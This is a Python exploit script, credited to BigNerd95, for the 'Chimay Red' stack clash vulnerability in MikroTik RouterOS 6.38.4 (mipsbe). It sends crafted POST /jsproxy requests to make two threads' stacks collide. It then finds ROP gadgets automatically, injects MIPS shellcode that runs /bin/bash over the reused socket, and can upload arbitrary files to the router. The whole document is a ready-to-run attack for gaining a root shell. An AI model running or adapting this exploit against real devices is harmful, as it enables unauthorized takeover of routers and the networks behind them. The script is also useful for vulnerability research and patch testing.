#!/usr/bin/env python3

# Mikrotik Chimay Red Stack Clash Exploit by BigNerd95

# Tested on RouterOS 6.38.4 (mipsbe) [using a CRS109]

# Used tools: pwndbg, rasm2, mipsrop for IDA
# I used ropper only to automatically find gadgets

# ASLR enabled on libs only
# DEP NOT enabled

import socket, time, sys, struct, re, telnetlib
from ropper import RopperService

AST_STACKSIZE = 0x800000 # default stack size per thread (8 MB)
ROS_STACKSIZE =  0x20000 # newer version of ROS have a different stack size per thread (128 KB)
SKIP_SPACE    =   0x1000 # 4 KB of "safe" space for the stack of thread 2
ROP_SPACE     =   0x8000 # we can send 32 KB of ROP chain!

ALIGN_SIZE    = 0x10 # alloca align memory with "content-length + 0x10 & 0xF" so we need to take it into account
ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain

class MyRopper():
    def __init__(self, filename):
        self.rs = RopperService()
        
        self.rs.clearCache()
        self.rs.addFile(filename)
        self.rs.loadGadgetsFor()
        
        self.rs.options.inst_count = 10
        self.rs.loadGadgetsFor()
        self.rs.loadGadgetsFor() # sometimes Ropper doesn't update new gadgets

    def get_gadgets(self, regex):
        gadgets = []
        for _, g in self.rs.search(search=regex):
            gadgets.append(g)

        if len(gadgets) > 0:
            return gadgets
        else:
            raise Exception("Cannot find gadgets!")

    def contains_string(self, string):
        s = self.rs.searchString(string)
        t = [a for a in s.values()][0]
        return len(t) > 0

    def get_arch(self):
        return self.rs.files[0].arch._name

    @staticmethod
    def get_ra_offset(gadget):
        """
            Return the offset of next Retun Address on the stack
            So you know how many bytes to put before next gadget address
            Eg: 
                lw $ra, 0xAB ($sp)   --> return: 0xAB
        """
        for line in gadget.lines:
            offset_len = re.findall("lw \$ra, (0x[0-9a-f]+)\(\$sp\)", line[1])
            if offset_len:
                return int(offset_len[0], 16)
        raise Exception("Cannot find $ra offset in this gadget!")

def makeHeader(num):
    return b"POST /jsproxy HTTP/1.1\r\nContent-Length: " + bytes(str(num), 'ascii') + b"\r\n\r\n"

def makeSocket(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
    except:
        print("Error connecting to socket")
        sys.exit(-1)
    print("Connected")
    time.sleep(0.5)
    return s

def socketSend(s, data):
    try:
        s.send(data)
    except:
        print("Error sending data")
        sys.exit(-1)
    print("Sent")
    time.sleep(0.5)

def upload(tsock, ufiles, upaths):
    fd = open(ufiles, 'rb')
    ufile = ufiles.encode("ascii")
    upath = upaths.encode("ascii")

    print("Uploading " + ufiles + " in " + upaths + "...")

    while True:
        data = fd.read(1024)
        if data:
            hexdata = ''.join('\\\\x{:02x}'.format(c) for c in data).encode("ascii")
            tsock.write(b"echo -e -n " + hexdata + b" >> " + upath + b"\n")
        else:
            break
    print("Upload done!")
    fd.close()

def build_shellcode():
    shell_code = b''

    
    # Here the shellcode will write the arguments for execve: ["/bin/bash", NULL] and [NULL]
    # XX XX XX XX  <-- here the shell code will write the address of string "/bin/bash"                           [shellcode_start_address -8]             <--- argv_array        
    # XX XX XX XX  <-- here the shell code will write 0x00000000 (used as end of argv_array and as envp_array)    [shellcode_start_address -4]             <--- envp_array        
    
    # The shell code execution starts here!
    shell_code += struct.pack('>L', 0x24500000)     # addiu s0, v0, 0           # s0 = v0                                               Save the shellcode_start_address in s0 (in v0 we have the address of the stack where the shellcode starts [<-- pointing to this location exactly]) 
    
    shell_code += struct.pack('>L', 0x24040002)     # addiu a0, zero, 0x2
    shell_code += struct.pack('>L', 0x24020fc9)     # addiu v0, zero, 0xfc9     # dup syscall
    shell_code += struct.pack('>L', 0x0000000c)     # syscall
    shell_code += struct.pack('>L', 0x2044fffe)     # addi a0, v0, -1           # a0 = dup(2) - 1                                       Find the latest active socket (allocates a new file descriptor, then subtract 1)
    
    shell_code += struct.pack('>L', 0x24050002)     # addiu a1, zero, 0x2
    shell_code += struct.pack('>L', 0x24020fdf)     # addiu v0, zero, 0xfdf     # dup2(a0, 2)                                           Use the found socket as stderr
    shell_code += struct.pack('>L', 0x0000000c)     # syscall
    
    shell_code += struct.pack('>L', 0x24050001)     # addiu a1, zero, 0x1
    shell_code += struct.pack('>L', 0x24020fdf)     # addiu v0, zero, 0xfdf     # dup2(a0, 1)                                           Use the found socket as stdout
    shell_code += struct.pack('>L', 0x0000000c)     # syscall
    
    shell_code += struct.pack('>L', 0x24050000)     # addiu a1, zero, 0x0
    shell_code += struct.pack('>L', 0x24020fdf)     # addiu v0, zero, 0xfdf     # dup2(a0, 0)                                           Use the found socket as stdin
    shell_code += struct.pack('>L', 0x0000000c)     # syscall

    # if someone connects to webfig will cause problem to reused socket, to avoid this leave fork() commented
    #shell_code += struct.pack('>L', 0x24020fa2)    # addiu v0, zero, 0xfa2     # v0 = 4002 (fork)                                       Put the syscall number of fork (4002) in v0
    #shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start fork()
    #shell_code += struct.pack('>L', 0x10400003)    # beqz v0, 0x10             # jump 12 byte forward if v0 == 0                        Jump to execve part of the shellcode if PID is 0
    
    # if v0 != 0 [res of fork()]
    #shell_code += struct.pack('>L', 0x24020001)    # addiu v0, zero, 1         # a0 = 1                                                 Put exit parameter in a0
    #shell_code += struct.pack('>L', 0x24020fa1)    # addiu v0, zero, 0xfa1     # v0 = 4001 (exit)                                       Put the syscall number of exit (4002) in v0
    #shell_code += struct.pack('>L', 0x0000000c)	# syscall                   # launch syscall                                         Start exit(1)

    # if v0 == 0 [res of fork()]
    shell_code += struct.pack('>L', 0x26040070)    # addiu a0, s0, 0x70        # a0 = shellcode_start_address + 0x50                    Calculate the address of string "/bin/bash" and put it in a0 (the first parameter of execve) 
    shell_code += struct.pack('>L', 0xae04fff8)    # sw a0, -8(s0)             # shellcode_start_address[-8] = bin_bash_address         Write in the first entry of the "argv" array the address of the string "/bin/bash" 
    shell_code += struct.pack('>L', 0xae00fffc)    # sw zero, -4(s0)           # shellcode_start_address[-4]  = 0x00                    Write NULL address as end of argv_array and envp_array
    shell_code += struct.pack('>L', 0x2205fff8)    # addi a1, s0, -8           # a1 = shellcode_start_address - 8                       Put the address of argv_array in a1 (the second parameter of execve)
    shell_code += struct.pack('>L', 0x2206fffc)    # addi a2, s0, -4           # a2 = shellcode_start_address - 4                       Put the address of envp_array in a2 (the third parameter of execve)
    shell_code += struct.pack('>L', 0x24020fab)    # addiu v0, zero, 0xfab     # v0 = 4011 (execve)                                     Put the syscall number of execve (4011) in v0   (https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h)
    shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start execve("/bin/bash", ["/bin/bash", NULL], [NULL])

    shell_code += b'P' * (0x70 - len(shell_code))   # offset to simplify string address calculation  
    shell_code += b'/bin/bash\x00'                           # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x50]                 <--- bin_bash_address

    return shell_code

def build_payload(binRop):
    print("Building shellcode + ROP chain...")

    ropChain = b''
    shell_code = build_shellcode()
    
    # 1) Stack finder gadget (to make stack pivot) 
    stack_finder = binRop.get_gadgets("addiu ?a0, ?sp, 0x18; lw ?ra, 0x???(?sp% jr ?ra;")[0]
    """
    0x0040ae04:                     (ROS 6.38.4)
        addiu $a0, $sp, 0x18   <--- needed action
        lw $ra, 0x5fc($sp)     <--- jump control   [0x5fc, a lot of space for the shellcode!]
        lw $s3, 0x5f8($sp)
        lw $s2, 0x5f4($sp)
        lw $s1, 0x5f0($sp)
        lw $s0, 0x5ec($sp)
        move $v0, $zero
        jr $ra
    """
    ropChain += struct.pack('>L', stack_finder.address)
    #                                            Action: addiu  $a0, $sp, 0x600 + var_5E8                      # a0 = stackpointer + 0x18
    #                                            Control Jump:  jr    0x600 + var_4($sp) 
    # This gadget (moreover) allows us to reserve 1512 bytes inside the rop chain 
    # to store the shellcode (beacuse of: jr 0x600 + var_4($sp))
    ropChain += b'B' * 0x18  # 0x600 - 0x5E8 = 0x18           (in the last 16 bytes of this offset the shell code will write the arguments for execve)
    ropChain += shell_code   # write the shell code in this "big" offset

    next_gadget_offset = MyRopper.get_ra_offset(stack_finder) - 0x18 - len(shell_code)
    if next_gadget_offset < 0: # check if shell command fits inside this big offset
        raise Exception("Shell command too long! Max len: " + str(next_gadget_offset) + " bytes")

    ropChain += b'C' * next_gadget_offset # offset because of this: 0x600 + var_4($sp)



    # 2) Copy a0 in v0 because of next gadget
    mov_v0_a0 = binRop.get_gadgets("lw ?ra, %move ?v0, ?a0;% jr ?ra;")[0]
    """
    0x00414E58:                    (ROS 6.38.4)
        lw $ra, 0x24($sp);    <--- jump control
        lw $s2, 0x20($sp); 
        lw $s1, 0x1c($sp); 
        lw $s0, 0x18($sp); 
        move $v0, $a0;        <--- needed action
        jr $ra;
    """
    ropChain += struct.pack('>L', mov_v0_a0.address) 
    #                                           Gadget Action:   move $v0, $a0                                 # v0 = a0
    #                                           Gadget Control:  jr  0x28 + var_4($sp) 
    ropChain += b'D' * MyRopper.get_ra_offset(mov_v0_a0) # offset because of this: 0x28 + var_4($sp) 



    # 3) Jump to the stack (start shell code)
    jump_v0 = binRop.get_gadgets("move ?t9, ?v0; jalr ?t9;")[0]
    """
    0x00412540:                   (ROS 6.38.4)
        move $t9, $v0;       <--- jump control
        jalr $t9;            <--- needed action
    """
    ropChain += struct.pack('>L', jump_v0.address)
    #                                           Gadget Action:   jalr $t9                                      # jump v0
    #                                           Gadget Control:  jalr  $v0    

    return ropChain

def stackClash(ip, port, payload):

    print("Opening 2 sockets")

    # 1) Start 2 threads
    # open 2 socket so 2 threads are created
    s1 = makeSocket(ip, port) # socket 1, thread A
    s2 = makeSocket(ip, port) # socket 2, thread B

    print("Stack clash...")

    # 2) Stack Clash
    # 2.1) send post header with Content-Length bigger than AST_STACKSIZE to socket 1 (thread A)
    socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)

    # 2.2) send some bytes as post data to socket 1 (thread A)
    socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved

    # 2.3) send post header with Content-Length to reserve ROP space to socket 2 (thread B)
    socketSend(s2, makeHeader(ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned

    print("Sending payload")

    # 3) Send ROP chain and shell code
    socketSend(s1, payload)

    print("Starting exploit")

    # 4) Start ROP chain
    s2.close() # close socket 2 to return from the function of thread B and start ROP chain

    print("Done!")

    return s1

def crash(ip, port):
    print("Crash...")
    s = makeSocket(ip, port)
    socketSend(s, makeHeader(-1))
    socketSend(s, b'A' * 0x1000)
    s.close()
    time.sleep(2.5) # www takes up to 3 seconds to restart

if __name__ == "__main__":
    if len(sys.argv) in (4, 6):
        ip       = sys.argv[1]
        port     = int(sys.argv[2])
        binary   = sys.argv[3]


        binRop = MyRopper(binary)

        if binRop.get_arch() != 'MIPSBE':
            raise Exception("Wrong architecture! You have to pass a mipsbe executable")

        if binRop.contains_string("pthread_attr_setstacksize"):
            AST_STACKSIZE = ROS_STACKSIZE

        payload = build_payload(binRop)

        crash(ip, port) # should make stack clash more reliable
        shell_sock = stackClash(ip, port, payload)

        # reuse socket
        t = telnetlib.Telnet()
        t.sock = shell_sock
        time.sleep(1)

        if len(sys.argv) == 6:
            upload_file = sys.argv[4]
            upload_path = sys.argv[5]
            upload(t, upload_file, upload_path)
        
        t.write(b"echo '\nGot root ;-)\n'\r\n")
        t.interact()

    else:
        print("Usage: " + sys.argv[0] + " IP PORT binary [upload_file dest_path]")
